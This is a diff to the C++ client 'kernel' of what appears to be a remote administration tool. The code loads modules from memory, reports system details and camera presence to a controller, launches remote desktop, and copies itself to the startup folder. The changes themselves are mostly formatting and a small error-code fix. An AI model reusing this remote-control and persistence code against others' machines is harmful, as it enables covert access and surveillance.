@@ -224,6 +224,7 @@ void CKernel::AddModule(const BYTE * lpData, UINT Size)
 	{
 		//load success.
 		//Kernel 每一时刻只能有一个在Load,...
+		Error = -6;			//FULL
 		for (int i = 0; i < MAX_MODULE_COUNT; i++)
 		{
 			if (m_LoadedModules[i].szModuleName[0] == 0)
@@ -231,6 +232,7 @@ void CKernel::AddModule(const BYTE * lpData, UINT Size)
 				m_LoadedModules[i].lpImageBase = lpImageBase;
 				m_LoadedModules[i].lpEntry = lpEntry;
 				lstrcpy(m_LoadedModules[i].szModuleName, m_CurrentModule);
+				Error = 0;
 				break;
 			}
 		}
@@ -240,8 +242,8 @@ void CKernel::AddModule(const BYTE * lpData, UINT Size)
 	{
 		dbg_log("LoadFromMem failed with error: %d \n", Error);
 	}
-
 }
+
 #define MAX_CHUNK_SIZE 0x10000
 
 void CKernel::GetModuleChunk()
@@ -514,7 +516,8 @@ void CKernel::GetOSName(TCHAR OsName[128])
 	TCHAR data[MAX_PATH] = { 0 };
 	OsName[0] = 0;
 
-	if (!RegOpenKey(HKEY_LOCAL_MACHINE,
+	if (!RegOpenKey(
+		HKEY_LOCAL_MACHINE,
 		TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"),
 		&hKey))
 	{
@@ -630,7 +633,8 @@ DWORD CKernel::HasCamera()
 	UINT nCam = 0;
 	CoInitialize(NULL);     
 	ICreateDevEnum *pCreateDevEnum;                          
-	HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum,     
+	HRESULT hr = CoCreateInstance(
+		CLSID_SystemDeviceEnum,     
 		NULL,                                                 
 		CLSCTX_INPROC_SERVER,                                 
 		IID_ICreateDevEnum,                                   
@@ -783,7 +787,7 @@ void CKernel::GetLoginInfo(LoginInfo*pLoginInfo)
 	GetComment(pLoginInfo->Comment);
 
 	m_pClient->GetPeerName((SOCKADDR*)&addr,&addrlen);
-	strcpy(peer_ip, inet_ntoa(addr.sin_addr));
+	lstrcpyA(peer_ip, inet_ntoa(addr.sin_addr));
 
 	pLoginInfo->dwPing = GetPing(peer_ip);
 	pLoginInfo->dwHasCamera = HasCamera();
@@ -842,7 +846,10 @@ void CKernel::OnEditComment(TCHAR NewComment[256])
 	HKEY hKey = NULL;
 	TCHAR error[0x100];
 	//Open Key
-	if (ERROR_SUCCESS == RegCreateKey(HKEY_CURRENT_USER, TEXT("SOFTWARE\\HHClient"), &hKey))
+	if (ERROR_SUCCESS == RegCreateKey(
+		HKEY_CURRENT_USER, 
+		TEXT("SOFTWARE\\HHClient"),
+		&hKey))
 	{
 		DWORD dwError = RegSetValueEx(
 			hKey, 
@@ -978,7 +985,6 @@ void CKernel::OnRemoteDesktop()
 		GetModule(TEXT("rd"));
 		return;
 	}
-
 
 	module->lpEntry(m_pClient->m_Iocp, Name, Port, NULL);
 }
@@ -1145,13 +1151,13 @@ void CKernel::OnProcessManager()
 void CKernel::OnUnilsCopyToStartupMenu()
 {
 
-	TCHAR StartupPath[MAX_PATH];
-	TCHAR  szError[0x100];
-	TCHAR exePath[MAX_PATH];
-	TCHAR workDir[MAX_PATH];
-	HRESULT hres;
-	IShellLink * pShellLink;
-	IPersistFile *pPersistFile;
+	TCHAR          StartupPath[MAX_PATH];
+	TCHAR          szError[0x100];
+	TCHAR		   exePath[MAX_PATH];
+	TCHAR		   workDir[MAX_PATH];
+	HRESULT		   hres;
+	IShellLink *   pShellLink;
+	IPersistFile * pPersistFile;
 
 	if (!SHGetSpecialFolderPath(NULL, StartupPath, CSIDL_STARTUP, FALSE))
 	{
